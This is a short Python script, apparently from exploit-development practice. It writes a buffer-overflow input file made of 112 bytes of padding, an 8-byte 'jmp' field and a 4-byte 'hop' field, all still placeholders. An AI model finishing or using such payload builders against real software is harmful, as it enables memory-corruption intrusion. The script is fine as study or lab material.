

f = open("payload.txt","wb")

buff = 3000 * b"A"


# 112 * A + 8 * B + CCCC

padding = 112 * b"A"

jmp = 8 * b"B"

hop = b"CCCC"



f.write(padding+jmp+hop)

f.close()
